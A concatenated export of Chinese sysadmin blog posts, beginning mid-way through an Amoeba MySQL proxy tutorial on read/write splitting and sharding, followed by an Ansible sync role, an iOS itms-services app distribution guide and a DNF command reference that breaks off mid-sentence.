#配置amoeba的全局配置文件 ​ dbServers.xml #配置amoeba连接mysql数据库的文件 ​ rule.xml #配置我们数据切分的文件 3.开始配置amoeba连接mysql数据库 Amoeba-dbServers配置 dbServers.xml：读写分离配置文件 access_list.conf：IP访问列表控制配置文件 默认禁止所有ip连接 12345vim /usr/local/amoeba/conf/access_list.conf0.0.0.0:no #表示允许所有连接192.168.224.12:yes #表示禁止连接的ip. 修改 ./conf/dbServers.xml 1vim /usr/local/amoeba/conf/dbServers.xml 12345678910111213141516171820 &lt;property name=&quot;port&quot;&gt;3306&lt;/property&gt; #修改端口，默认是3306，可以不修改23 &lt;property name=&quot;schema&quot;&gt;aaa&lt;/property&gt; #指定访问数据库26 &lt;property name=&quot;user&quot;&gt;mysql&lt;/property&gt; #登陆数据库的用户名29 &lt;property name=&quot;password&quot;&gt;123.Shui!!@#&lt;/property&gt; #设置登陆密码 把注释打开，或者复制这行45 &lt;dbServer name=&quot;server1&quot; parent=&quot;abstractServer&quot;&gt; #服务器1，mysql主服务器，45-50行是一段 #设置一个后端可写的dbServer，这里定义为server1，这个名字可以任意命名，后面还会用到。46 &lt;factoryConfig&gt;47 &lt;!-- mysql ip --&gt;48 &lt;property name=&quot;ipAddress&quot;&gt;192.168.224.12&lt;/property&gt; #mysql主服务器IP49 &lt;/factoryConfig&gt;50 &lt;/dbServer&gt;51 52 &lt;dbServer name=&quot;server2&quot; parent=&quot;abstractServer&quot;&gt; #服务器2,mysql从服务器，52-57行是一段53 &lt;factoryConfig&gt;54 &lt;!-- mysql ip --&gt;55 &lt;property name=&quot;ipAddress&quot;&gt;192.168.224.13&lt;/property&gt; #mysql从服务器IP56 &lt;/factoryConfig&gt;57 &lt;/dbServer&gt; 如果要再定义一台从服务器，可以再这里增加内容，（45-50行）6yy复制6行 p粘贴，把name=”server2”改成”server3”再修改对应IP就可以了 再修改 ./conf/amoeba.xml 文件 1vim /usr/local/amoeba/conf/amoeba.xml 设置amoeba监听的端口，默认是8066 12345678910111211 &lt;property name=&quot;port&quot;&gt;8066&lt;/property&gt; #修改端口(可以改可以不改)15 &lt;property name=&quot;ipAddress&quot;&gt;127.0.0.1&lt;/property&gt; #配置监听接口，不设置默认监听所有IP30 &lt;property name=&quot;user&quot;&gt;amoeba&lt;/property&gt; #客户端访问amoeba时的用户名32 &lt;property name=&quot;password&quot;&gt;123&lt;/property&gt; #客户端访问amoeba时的密码117 &lt;!-- #删除该行，去掉注释118 &lt;property name=&quot;writePool&quot;&gt;server1&lt;/property&gt; #这里指定写走server1119 &lt;property name=&quot;readPool&quot;&gt;server2&lt;/property&gt; #把server1改成server2,指定读120 --&gt; #删除该行，去掉注释 注意： 以上配置客户端连接amoeba时需要使用这里设定的账号； 此处账号密码和amoeba连接后端数据库服务器的密码无关； 前端应用程序连接数据库的地址就是Amoeba服务器的值，连接用户名和密码即为此处配置的用户名和密码。 4、修改amoeba启动文件 启动文件/usr/local/amoeba/bin/amoeba 是需要jdk的支持才能启动，下面我们配置启动文件指定访问jdk 在第1步时我们解压了jdk，这里要配置amoeba访问jdk 1234vim /usr/local/amoeba/bin/amoeba vim /usr/local/amoeba/bin/launcher #新的amoeba改为这个文件名了。启动文件vim /usr/local/amoeba/bin/shutdown #停止服务， 都需要设置jdk的环境变量。 在10行下面，加上以下代码 123JAVA_HOME=/usr/local/javaPATH=$PATH:$JAVA_HOME/binexport JAVA_HOME PATH 修改-Xss196k的大小 1vim /usr/local/amoeba/jvm.properties 把 Xss196k 改成228k，因启动时要求最低内存是228k，我这里改成512k,物理内存1024m 12JVM_OPTIONS=&quot;-server -Xms256m -Xmx1024m -Xss512k -XX:PermSize=16m -XX:MaxPermSize=96m&quot; 注：-Xms256m #分配256m物理内存给amoeba软件用，连接数据库时初始化内存就要256m ​ -Xmx256m #这个是amoeba软件最大可用的物理内存，（32位的JDK最大只能是2G，64位的JDK无限制但不能大于本机的物理内存大小） ​ -Xss128k #默认是128k，但amoeba软件要求是228k，这个启动amoeba软件就要228k的内存 再使用nohup方法启动amoeba服务 nohup ./bin/amoeba start &amp; –这个启动方法把启动的信息写进nohup.out文件里，并在后台运行。建议用这种方法，方便我们排错。 绝对路径： nohup /usr/local/amoeba/bin/amoeba start &amp; 启动的另外二个方法：建议不使用 ​ ./bin/amoeba start &amp; –这个启动的方法是把启动的信息打印在终端窗口。 ​ ./bin/amoeba start &gt;/dev/null &amp; –把启动的信息输出到/dev/null 空洞里面。 查看是否启动 1netstat -putnal |grep java 第二大步:在mysql主从服务器上授权并验证为了方便验证，把两台mysql复制关闭，然后两台mysql都新建下面的测试表 下面的步骤，两台数据库都要操作执行。 1234567891011mysql&gt; create database aaa;Query OK, 1 row affected (0.00 sec)mysql&gt; use aaa;Database changedmysql&gt; create table emp (id int,ename varchar(20));Query OK, 0 rows affected (0.01 sec)mysql&gt; insert into emp values(1,&quot;master&quot;); #主服务器插入这一条mysql&gt; insert into emp values(1,&quot;slave&quot;); #从服务器插入这一条 并对mysql进行授权，授权的IP为amoeba的IP 创建用户 1create user 'mysql'@'%' identified with mysql_native_password by '123.Shui!!@#'; 授权 12grant all on aaa.* to 'mysql'@'%';flush privileges; 授权后,可以去amoeba(192.168.224.11)这台去连接一下这两个mysql,需要能连才行，如果不能连则把上面再做一遍 在amoeba服务器测试连接两台mysql 12mysql -umysql -h192.168.224.12 -P3306 -p'123.Shui!!@#'mysql -umysql -h192.168.224.13 -P3306 -p'123.Shui!!@#' 如果防火墙清空后还是连不上192.168.224.13的话， 可以把13这台mysql重启 或者在mysql服务器上执行命令 1mysqladmin flush-hosts -p'123.Shui!!' 第三大步：在客户端进行测试客户端使用mysql命令连接 amoeba服务器登陆测试 1mysql -uamoeba -p123 -h192.168.224.11 -P8066 注意开放对应的端口 1iptables -A INPUT -p tcp -m multiport --dport 8066 -j ACCEPT 登录后测试 12345678mysql&gt; use aaa;Database changedmysql&gt; mysql&gt; mysql&gt; insert into emp values(3,'test'); #这里往数据库插入了一条数据，插入的动作是指定到了mysql主，只能去master主才可以查到数据。Query OK, 1 row affected (0.01 sec)mysql&gt; select * from emp; #这里再查时，看不到刚插入的数据，是因为读我们指定到了mysql从 真实环境就要把主从复制打开 Amoeba集群 之 读集群集群的好处是，可以让服务器平均负载我们连接请求 Amoeba集群分发算法有三种： 1=ROUNDROBIN , 2=WEIGHTBASED , 3=HA ROUNDROBIN #代表轮询，1台访问一次 WEIGHTBASED #代表加权轮询，是以哪一台性能好就承载多一点连接 HA #代表高可用 把读写分离改成读集群的条件是至少2台服务器做读， 第一步：配置dbServers.xml文件: dbServer.xml文件里的 59行~67行 是设置集群的段 我们关注的行有59，62，65行 ​ 59行的 name=”multiPool”，这个是设置服务器集群名称，在amoeba.xml文件里设备读服务器时要用到 ​ 62行是设置集群的算法，默认是1轮询 ​ 65行是设置服务器列表。 以下是配置代码： 1vim /usr/local/amoeba/conf/dbServers.xml #设置定义一个虚拟的dbserver，实际上相当于一个dbserver组，这里将可读的数据库ip统一放到一个组中，将这个组的名字命名为myslave。 1234567891059 &lt;dbServer name=&quot;myslave&quot; virtual=&quot;true&quot;&gt;60 &lt;poolConfig class=&quot;com.meidusa.amoeba.server.MultipleServerPool&quot;&gt;61 &lt;!-- Load balancing strategy: 1=ROUNDROBIN , 2=WEIGHTBASED , 3=HA--&gt;62 &lt;property name=&quot;loadbalance&quot;&gt;1&lt;/property&gt;63 #选择调度算法，1表示负载均衡，2表示权重，3表示HA， 这里选择164 &lt;!-- Separated by commas,such as: server1,server2,server1 --&gt;65 &lt;property name=&quot;poolNames&quot;&gt;server1,server2&lt;/property&gt; #组成员66 &lt;/poolConfig&gt;67 &lt;/dbServer&gt; 第二步：配置amoeba.xml文件： amoeba.xml文件里我们要修改以下行。 1234567vim /usr/local/amoeba/conf/amoeba.xml #修改配置文件 &lt;property name=&quot;defaultPool&quot;&gt;myslave&lt;/property&gt; #设置amoeba默认的池，这里设置为myslave &lt;property name=&quot;writePool&quot;&gt;server1&lt;/property&gt; #设置写的服务器， &lt;property name=&quot;readPool&quot;&gt;myslave&lt;/property&gt; #设置读的服务器。将原来的server2改成myslave。myslave就是第一步设置的集群服务器名称 第三步：重启amoeba代理软件。 12nohup /usr/local/amoeba/bin/launcher &amp; 启动/usr/local/amoeba/bin/shutdown 停止 第四步：在客户机上测试读集群是否生效。 先在sql服务器上创建emp表 1mysql&gt; create table emp (id int, ename varchar(20)); 在客户机上使用mysql命令登陆amoeba服务器 1mysql -uamoeba -p123 -h192.168.224.11 -P8066 往emp表里插入两条数据 123mysql&gt; insert into emp values(10,&quot;test1&quot;); mysql&gt; insert into emp values(11,&quot;test11&quot;); 注：配置文件定义的是客户端写入数据是进入server1服务器上，server2服务器上就没有数据， ​ 客户端也可以读server1服务器上的数据。 再查询emp表的数据 1mysql&gt; select * from emp; 查询的时候一次查询mysql 1上面的数据，再查询一次又跳到另外一台mysql服务器上了 真实环境需要把集群搭建好，数据需要同步。这里是测试，所以才分别建的不同表， 到此mysql读集群配置完毕。 Mysql 数据切分是按照不同的数据访问不同的数据库 第一步：搭建前，先关闭读写分离和主从复制 vim /usr/local/amoeba/conf/amoeba.xml #把下面的内容注释，读写分离成功关闭。 1234 &lt;!-- 86 &lt;property name=&quot;writePool&quot;&gt;server1&lt;/property&gt;87 &lt;property name=&quot;readPool&quot;&gt;server2&lt;/property&gt;89 --&gt; 第二步：配置数据切片 面我是按aaa.emp表里的emp_id这一列来切分，当它为奇数就给server2,为偶数就给server1 修改第三个配置文件，定义数据切分的规则 1vim /usr/local/amoeba/conf/rule.xml 参数解释 12345678910111213141516&lt;?xml version=&quot;1.0&quot; encoding=&quot;gbk&quot;?&gt;&lt;!DOCTYPE amoeba:rule SYSTEM &quot;rule.dtd&quot;&gt;&lt;amoeba:rule xmlns:amoeba=&quot;http://amoeba.meidusa.com/&quot;&gt; &lt;tableRule name=&quot;emp&quot; schema=&quot;aaa&quot; defaultPools=&quot;server1,server2&quot;&gt; #name代表 表名称，schema代表数据库名，defaultPools代表可支持的服务器 &lt;rule name=&quot;rule1&quot; ruleResult=&quot;POOLNAME&quot;&gt; #name 代表切片动作的名称 &lt;parameters&gt;id&lt;/parameters&gt; #代表aaa.emp表里哪个字段要做切片的判断 &lt;expression&gt;&lt;![CDATA[ #切片开始 var division = id % 2; #定义division变量，值为 id % 2 ，也就是取余 case division when 1 then 'server1'; #变量值不能被2整除的转到server1 when 0 then 'server2'; #变量值能被2整除的转到server2 end case; ]]&gt; #切片结束 &lt;/expression&gt; &lt;/rule&gt; &lt;/tableRule&gt;&lt;/amoeba:rule&gt; 先拷贝一份默认文件 1cp /usr/local/amoeba/conf/rule.xml /usr/local/amoeba/conf/rule.xml.bak 直接复制粘贴上去，格式空格之类的太多；可以先在vim里:set paste再insert模式粘贴上去就可以了 12345678910111213141516&lt;?xml version=&quot;1.0&quot; encoding=&quot;gbk&quot;?&gt;&lt;!DOCTYPE amoeba:rule SYSTEM &quot;rule.dtd&quot;&gt;&lt;amoeba:rule xmlns:amoeba=&quot;http://amoeba.meidusa.com/&quot;&gt; &lt;tableRule name=&quot;emp&quot; schema=&quot;aaa&quot; defaultPools=&quot;server1,server2&quot;&gt; &lt;rule name=&quot;rule1&quot; ruleResult=&quot;POOLNAME&quot;&gt; &lt;parameters&gt;id&lt;/parameters&gt; &lt;expression&gt;&lt;![CDATA[ var division = id % 2; case division when 1 then 'server1'; when 0 then 'server2'; end case; ]]&gt; &lt;/expression&gt; &lt;/rule&gt; &lt;/tableRule&gt;&lt;/amoeba:rule&gt; 备：复制到rule.xml文件后，要把后面的中文注释删除，光标移到需要删除的地方。使用命令d$ 第三步:重启amoeba 如果配置文件出错会启动不了： 12nohup /usr/local/amoeba/bin/launcher &amp; 启动/usr/local/amoeba/bin/shutdown 停止 第四步:客户端测试 在客户端连接进行测试，连接的IP为amoeba的IP，端口为8066 1mysql -h192.168.224.11 -uamoeba -p123 -P8066 意:amoeba是根据sql解析来进行数据切分的，所以需要把切分的关键字段（这里是emp表的id字段）加入到sql中.否则切分规则无效。无效后,会在 server1,server2 均都插入数据。 1insert into aaa.emp values (1,'aaa'); #这样做是错误的，会在两个后台数据库里都插入数据 正确的插入方法 1234mysql&gt; insert into aaa.emp(id,ename) values (1,'aaa');mysql&gt; insert into aaa.emp(id,ename) values (2,'bbb');mysql&gt; insert into aaa.emp(id,ename) values (3,'ccc');mysql&gt; insert into aaa.emp(id,ename) values (4,'ddd'); 然后去server1(192.168.224.12)上查看，只有1,3两条数据 去server2(192.168.224.13)上查看，只有2,4两条数据 ​ 数据切分成功 delete和update操作也是同理 数据水平切分 按照上面的配置文件，只修改rule.xml规则文件如下，做成以emp_id值的范围来进行水平切分 下面实现的是id小于等于100的任何操作都在server1,大于100的任何操作都是在server2 12345678910111213141516171819202122&lt;?xml version=&quot;1.0&quot; encoding=&quot;gbk&quot;?&gt;&lt;!DOCTYPE amoeba:rule SYSTEM &quot;rule.dtd&quot;&gt;&lt;amoeba:rule xmlns:amoeba=&quot;http://amoeba.meidusa.com/&quot;&gt; &lt;tableRule name=&quot;emp&quot; schema=&quot;aaa&quot; defaultPools=&quot;server1,server2&quot;&gt; &lt;rule name=&quot;rule1&quot;&gt; # 注意: (ruleResult=&quot;POOLNAME&quot;) 这句不要添加， 否则客户端插入数据会报错 &lt;parameters&gt;id&lt;/parameters&gt; &lt;expression&gt;&lt;![CDATA[ id &lt;= 100]]&gt;&lt;/expression&gt; &lt;defaultPools&gt;server1&lt;/defaultPools&gt; &lt;readPools&gt;server1&lt;/readPools&gt; &lt;writePools&gt;server1&lt;/writePools&gt; &lt;/rule&gt; &lt;rule name=&quot;rule2&quot;&gt; &lt;parameters&gt;id&lt;/parameters&gt; &lt;expression&gt;&lt;![CDATA[ id &gt; 100]]&gt;&lt;/expression&gt; &lt;defaultPools&gt;server2&lt;/defaultPools&gt; &lt;readPools&gt;server2&lt;/readPools&gt; &lt;writePools&gt;server2&lt;/writePools&gt; &lt;/rule&gt; &lt;/tableRule&gt;&lt;/amoeba:rule&gt; 重启amoeba 12nohup /usr/local/amoeba/bin/launcher &amp; 启动/usr/local/amoeba/bin/shutdown 停止 客户端测试 1mysql -h192.168.224.11 -uamoeba -p123 -P8066 id分别输入大于100和小于100测试 1234mysql&gt; insert into aaa.emp(id,ename) values (99,'aaa');mysql&gt; insert into aaa.emp(id,ename) values (100,'bbb');mysql&gt; insert into aaa.emp(id,ename) values (101,'ccc');mysql&gt; insert into aaa.emp(id,ename) values (102,'ddd'); 数据水平切分成功 Amoeba数据切分 之 垂直切分: 架构图 1234567891011client 192.168.224.10 | | amoeba 192.168.224.11 | | |------------------｜ mysqlA mysqlB 192.168.224.12 192.168.224.13 aaa.aaa表 aaa.bbb表 第一步：准备测试环境 1、先把两个mysql（不做AB复制的）以前的数据删掉，新建两个表来做测试 192.168.224.12上 123mysql&gt; create database aaa;mysql&gt; use aaa;mysql&gt; create table aaa.aaa (id int); 192.168.224.13上 123mysql&gt; create database aaa;mysql&gt; use aaa;mysql&gt; create table aaa.bbb (id int); 第二步：修改rule.xml配置文件 1vim /usr/local/amoeba/conf/rule.xml #清空文件内容，加上下面一段 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;gbk&quot;?&gt;&lt;!DOCTYPE amoeba:rule SYSTEM &quot;rule.dtd&quot;&gt;&lt;amoeba:rule xmlns:amoeba=&quot;http://amoeba.meidusa.com/&quot;&gt; &lt;tableRule name=&quot;aaa&quot; schema=&quot;aaa&quot; defaultPools=&quot;server1&quot;/&gt; &lt;tableRule name=&quot;bbb&quot; schema=&quot;aaa&quot; defaultPools=&quot;server2&quot;/&gt;&lt;/amoeba:rule&gt; 第三步:重启amoeba 12nohup /usr/local/amoeba/bin/launcher &amp; /usr/local/amoeba/bin/shutdown 第四步：在客户端测试 1mysql -uamoeba -p123 -h192.168.224.11 -P8066 12345678mysql&gt; use aaa;mysql&gt; insert into aaa values (1); #这一条被插入到192.168.224.12上的aaa.aaa表mysql&gt; insert into bbb values (2); #这一条被插入到192.168.224.13上的aaa.bbb表服务器分别查询select * from aaa.aaa;select * from aaa.bbb;","link":"/2020/08/03/amoeba%E4%BB%A3%E7%90%86/"},{"title":"ansible批量管理服务器","text":"ansible批量管理服务器同步web服务1.建立一个文件 vim /etc/ansible/roles/tongbu/tasks/main.yml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950---- name : 同步文件 synchronize : src : /software dest : / delete : yes #rsync_timeout : 10 register : reload- name : 创建链接目录 file : state : directory path : /etc/nginx/{{ item.dir }} with_items : - { dir : 'conf' } - { dir : 'kis' }- name : 域名证书及配置文件软链接 file : state : link src : /software/{{ item.name }} path : /etc/nginx/{{ item.dir }}/{{ item.name }} register : result with_items : - { dir : 'conf', name : '域名证书' } - { dir : 'kis', name : '站点配置文件' }- name : 检测Web应用 stat : path : /usr/bin/openresty register: p- name : 修改文件夹属主 shell : chown nginx. /etc/nginx/{{ item.dir }} -R args : warn: False when : result is changed and p.stat.exists == False with_items : - { dir : 'conf' } - { dir : 'kis' }- name : 重载nginx配置 service : name : nginx state : reloaded when : reload is changed and p.stat.exists == False- name : 重载Openresty配置 command: /usr/bin/openresty -s reload when : p.stat.exists 建一个剧本文件 vim /etc/ansible/tb.xml 12345--- - hosts : China remote_user : root roles: - tongbu 3,定义的组是China，需要在/etc/ansible/hosts 文件里新建主机组 最后就是执行剧本 1sudo ansible-playbook /etc/ansible/tb.xml 可以创建别名，这样方便每次执行 1alias tb=' sudo ansible-playbook /etc/ansible/tb.xml'","link":"/2020/08/04/ansible%E6%89%B9%E9%87%8F%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"ios的app包配置plist文件及下载链接","text":"通过 itms-services 协议，发布或者分享 iOS 应用程序 itms-services 协议常用于 iOS 企业应用的无线部署，这可在不使用 iTunes 的情况下将内部软件发布或者分享给用户。 一、前期准备资料： 1、应用程序 (.ipa) 文件（使用了企业级预置描述文件）；2、清单 (.plist) 文件（xml格式的清单描述文件）。 二、准备清单 (.plist) 文件： 我们的清单文件时一个xml格式的文件，可以参考如下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;items&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;assets&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;kind&lt;/key&gt; &lt;string&gt;software-package&lt;/string&gt; &lt;key&gt;url&lt;/key&gt; &lt;string&gt;&lt;![CDATA[https://666-ff.oss-cn-shenzhen.aliyuncs.com/666ff.ipa]]&gt;&lt;/string&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;kind&lt;/key&gt; &lt;string&gt;display-image&lt;/string&gt; &lt;key&gt;needs-shine&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;key&gt;url&lt;/key&gt; &lt;string&gt;&lt;![CDATA[https://666-ff.oss-cn-shenzhen.aliyuncs.com/logo.png]]&gt;&lt;/string&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;kind&lt;/key&gt; &lt;string&gt;full-size-image&lt;/string&gt; &lt;key&gt;needs-shine&lt;/key&gt; &lt;true/&gt; &lt;key&gt;url&lt;/key&gt; &lt;string&gt;&lt;![CDATA[https://666-ff.oss-cn-shenzhen.aliyuncs.com/logo.png]]&gt;&lt;/string&gt; &lt;/dict&gt; &lt;/array&gt; &lt;key&gt;metadata&lt;/key&gt; &lt;dict&gt; &lt;key&gt;bundle-identifier&lt;/key&gt; &lt;string&gt;com.666ff.cocosios&lt;/string&gt; &lt;key&gt;bundle-version&lt;/key&gt; &lt;string&gt;&lt;![CDATA[1.1.0]]&gt;&lt;/string&gt; &lt;key&gt;kind&lt;/key&gt; &lt;string&gt;software&lt;/string&gt; &lt;key&gt;title&lt;/key&gt; &lt;string&gt;&lt;![CDATA[666ff]]&gt;&lt;/string&gt; &lt;/dict&gt; &lt;/dict&gt; &lt;/array&gt; &lt;/dict&gt;&lt;/plist&gt; 描述文件需要注意的三个地方： 1、两个 url 地址，即 software-package 和 display-image 的 URL，前者是所要安装的 ipa 地址，后者是安装时桌面显示的 logo 图标。2、metadata里需要修改 bundle-identifier 和 bundle-version，具体是什么就不用介绍了，但是要注意一定要跟所安装的 ipa 包内容一致，不然无法安装成功。3、可以修改title和subtitle，定制安装时弹出框的内容。 那么plist文件内容是这样的。内容主要是告诉我们下载ipa文件的地址和icon图片的下载地址。这个文件必须通过https的访问才可以。因为现在苹果规定必须以https的方式进行访问 三、ipa格式应用的分享或者发布 可以使用以下两种方式提供下载： 第1种是点击下载，在网页中加入如下的链接就行了： 1&lt;a href=&quot;itms-services://?action=download-manifest&amp;url=https://xxx-qq.oss-cn-shenzhen.aliyuncs.com/xxxx.plist&quot;&gt;下载App&lt;/a&gt; 第2种是通过JavaScript自动下载，参考代码： 1&lt;script&gt; var url = &quot;https://xxx-qq.oss-cn-shenzhen.aliyuncs.com/xxxx.plist&quot;; window.location = &quot;itms-services://?action=download-manifest&amp;url=&quot; + url;&lt;/script&gt; 备注：此代码放到 html 标签的 head 标记中，这样就会自动提示下载和安装了。 备注：请勿使用应用程序 (.ipa) 的 Web 链接方式提供下载。当打开清单文件（manifest.plist）时，设备会下载该 .ipa。虽然 URL 的协议部分是 itms-services，但 iTunes Store 并不参与此过程。 从itms-services协议中获取ipa的下载地址在html代码里面配置ipa的plist文件 12345678910111213&lt;script type=&quot;text/javascript&quot;&gt; function DownSoft() { openInstall.wakeupOrInstall(); if (isIOS) { $(&quot;#xrBox&quot;).show(); showXR(); // window.open(&quot;https://ff66.app2.xin&quot;, &quot;_blank&quot;); window.location.href = &quot;itms-services://?action=download-manifest&amp;url=https://xxx-qq.oss-cn-shenzhen.aliyuncs.com/xxxx.plist&quot;; } else { $(&quot;#xrBox&quot;).hide(); } } &lt;/script&gt;","link":"/2020/08/05/app%E5%8C%85%E9%85%8D%E7%BD%AEplist%E6%96%87%E4%BB%B6%E5%8F%8A%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5/"},{"title":"dnf包管理","text":"dnf包管理器新一代的RPM软件包管理器 补充说明DNF 是新一代的rpm软件包管理器。他首先出现在 Fedora 18 这个发行版中。而最近，它取代了yum，正式成为 Fedora 22 的包管理器。 DNF包管理器克服了YUM包管理器的一些瓶颈，提升了包括用户体验，内存占用，依赖分析，运行速度等多方面的内容。DNF使用 RPM, libsolv 和 hawkey 库进行包管理操作。尽管它没有预装在 CentOS 和 RHEL 7 中，但你可以在使用 YUM 的同时使用 DNF 。你可以在这里获得关于 DNF 的更多知识：《 DNF 代替 YUM ，你所不知道的缘由》 DNF 的最新稳定发行版版本号是 1.0，发行日期是2015年5月11日。 这一版本的额 DNF 包管理器（包括在他之前的所有版本） 都大部分采用 Python 编写，发行许可为GPL v2. 安装 DNF 包管理器DNF 并未默认安装在 RHEL 或 CentOS 7系统中，但是 Fedora 22 已经默认使用 DNF . 1、为了安装 DNF ，您必须先安装并启用 epel-release 依赖。 在系统中执行以下命令： 12yum update yum install epel-release -y 2、使用 epel-release 依赖中的 YUM 命令来安装 DNF 包。在系统中执行以下命令： 1yum install dnf -y 然后， DNF 包管理器就被成功的安装到你的系统中了。使用这些命令，你可以方便有效的管理您系统中的 RPM 软件包。现在，开始学习 DNF 包管理器的27条常用命令！ 查看 DNF 包管理器版本 用处：该命令用于查看安装在您系统中的 DNF 包管理器的版本 1dnf –version 如果有报错 12345678910111213141516[root@server1 ~]# dnf --version4.0.9Traceback (most recent call last): File &quot;/usr/bin/dnf&quot;, line 58, in &lt;module&gt; main.user_main(sys.argv[1:], exit_code=True) File &quot;/usr/lib/python2.7/site-packages/dnf/cli/main.py&quot;, line 179, in user_main errcode = main(args) File &quot;/usr/lib/python2.7/site-packages/dnf/cli/main.py&quot;, line 64, in main return _main(base, args, cli_class, option_parser_class) File &quot;/usr/lib/python2.7/site-packages/dnf/cli/main.py&quot;, line 95, in _main cli.configure(list(map(ucd, args)), option_parser()) File &quot;/usr/lib/python2.7/site-packages/dnf/cli/cli.py&quot;, line 868, in configure self.base.output) File &quot;/usr/lib/python2.7/site-packages/dnf/cli/cli.py&quot;, line 137, in print_versions sm_ui_time(pkg.installtime)))UnicodeDecodeError: 'ascii' codec can't decode byte 0xe5 in position 4: ordinal not in range(128) 这是由于python2中的编码bug，需要在python目录/lib/python2.7/site-packages/中新建一个文件（系统pyhton目录：/usr/lib/python2.7/site-packages/）： sitecustomize.py, 其中包含下列代码 vim /usr/lib/python2.7/site-packages/sitecustomize.py 输入下面的内容 12import syssys.setdefaultencoding('utf-8') 然后验证一下 12345678910111213[root@server1 site-packages]# dnf --version4.0.9 已安装： dnf-0:4.0.9.2-1.el7_6.noarch 在 2020年07月16日 星期四 07时04分39秒 构建 ：CentOS BuildSystem &lt;http://bugs.centos.org&gt; 在 2019年02月13日 星期三 20时19分33秒 已安装： rpm-0:4.11.3-43.el7.x86_64 在 2020年07月16日 星期四 05时57分44秒 构建 ：CentOS BuildSystem &lt;http://bugs.centos.org&gt; 在 2020年04月01日 星期三 04时21分52秒~ $ dnf --version4.0.9 已安装： dnf-0:4.0.9.2-1.el7_6.noarch 在 2020年05月28日 星期四 08时54分59秒 构建 ：CentOS BuildSystem &lt;http://bugs.centos.org&gt; 在 2019年02月13日 星期三 20时19分33秒 已安装： rpm-0:4.11.3-35.el7.x86_64 在 2019年02月20日 星期三 04时14分24秒 构建 ：CentOS BuildSystem &lt;http://bugs.centos.org&gt; 在 2018年10月30日 星期二 19时27分14秒 完美~ DNF常用命令查看系统中可用的 DNF 软件库 用处：该命令用于显示系统中可用的 DNF 软件库 1dnf repolist 查看系统中可用和不可用的所有的 DNF 软件库 用处：该命令用于显示系统中可用和不可用的所有的 DNF 软件库 1dnf repolist all 列出所有 RPM 包 用处：该命令用于列出用户系统上的所有来自软件库的可用软件包和所有已经安装在系统上的软件包 1dnf list 列出所有安装了的 RPM 包 用处：该命令用于列出所有安装了的 RPM 包 1dnf list installed 列出所有可供安装的 RPM 包 用处：该命令用于列出来自所有可用软件库的可供安装的软件包 1dnf list available 搜索软件库中的 RPM 包 用处：当你不知道你想要安装的软件的准确名称时，你可以用该命令来搜索软件包。你需要在”search”参数后面键入软件的部分名称来搜索。（在本例中我们使用”vim”） 1dnf search vim 查找某一文件的提供者 用处：当你想要查看是哪个软件包提供了系统中的某一文件时，你可以使用这条命令。（在本例中，我们将查找”/bin/bash”这个文件的提供者） 1dnf provides /bin/bash 查看软件包详情 用处：当你想在安装某一个软件包之前查看它的详细信息时，这条命令可以帮到你。（在本例中，我们将查看”nano”这一软件包的详细信息） 1dnf info nano 安装软件包 用处：使用该命令，系统将会自动安装对应的软件及其所需的所有依赖（在本例中，我们将用该命令安装nano软件） 1dnf install -y nano 升级软件包 用处：该命令用于升级制定软件包（在本例中，我们将用命令升级”systemd”这一软件包） 1dnf update systemd 检查系统软件包的更新 用处：该命令用于检查系统中所有软件包的更新 1dnf check-update 升级所有系统软件包 用处：该命令用于升级系统中所有有可用升级的软件包 1dnf update 或 # dnf upgrade 删除软件包 用处：删除系统中指定的软件包（在本例中我们将使用命令删除”nano”这一软件包） 1dnf remove nano 或 # dnf erase nano 删除无用孤立的软件包 用处：当没有软件再依赖它们时，某一些用于解决特定软件依赖的软件包将会变得没有存在的意义，该命令就是用来自动移除这些没用的孤立软件包。 1dnf autoremove 删除缓存的无用软件包 用处：在使用 DNF 的过程中，会因为各种原因在系统中残留各种过时的文件和未完成的编译工程。我们可以使用该命令来删除这些没用的垃圾文件。 1dnf clean all 获取有关某条命令的使用帮助 用处：该命令用于获取有关某条命令的使用帮助（包括可用于该命令的参数和该命令的用途说明）（本例中我们将使用命令获取有关命令”clean”的使用帮助） 1dnf help clean 查看所有的 DNF 命令及其用途 用处：该命令用于列出所有的 DNF 命令及其用途 1dnf help 查看 DNF 命令的执行历史 用处：您可以使用该命令来查看您系统上 DNF 命令的执行历史。通过这个手段您可以知道在自您使用 DNF 开始有什么软件被安装和卸载。 1dnf history 查看所有的软件包组 用处：该命令用于列出所有的软件包组 1dnf grouplist 安装一个软件包组 用处：该命令用于安装一个软件包组（本例中，我们将用命令安装”Educational Software”这个软件包组） 1dnf groupinstall ‘Educational Software’ 升级一个软件包组中的软件包 用处：该命令用于升级一个软件包组中的软件包（本例中，我们将用命令升级”Educational Software”这个软件包组中的软件） 1dnf groupupdate ‘Educational Software’ 删除一个软件包组 用处：该命令用于删除一个软件包组（本例中，我们将用命令删除”Educational Software”这个软件包组） 1dnf groupremove ‘Educational Software’ 从特定的软件包库安装特定的软件 用处：该命令用于从特定的软件包库安装特定的软件（本例中我们将使用命令从软件包库 epel 中安装 phpmyadmin 软件包） 1dnf –enablerepo=epel install phpmyadmin 更新软件包到最新的稳定发行版 用处：该命令可以通过所有可用的软件源将已经安装的所有软件包更新到最新的稳定发行版 1dnf distro-sync 重新安装特定软件包 用处：该命令用于重新安装特定软件包（本例中，我们将使用命令重新安装”nano”这个软件包） 1dnf reinstall nano 回滚某个特定软件的版本 用处：该命令用于降低特定软件包的版本（如果可能的话）（本例中，我们将使用命令降低”acpid”这个软件包的版本） 1dnf downgrade acpid 样例输出： 123Using metadata from Wed May 20 12:44:59 2015No match for available package: acpid-2.0.19-5.el7.x86_64Error: Nothing to do. 原作者注：在执行这条命令的时候， DNF 并没有按照我期望的那样降级指定的软件（“acpid”）。该问题已经上报。 总结DNF 包管理器作为 YUM 包管理器的升级替代品，它能自动完成更多的操作。但在我看来，正因如此，所以 DNF 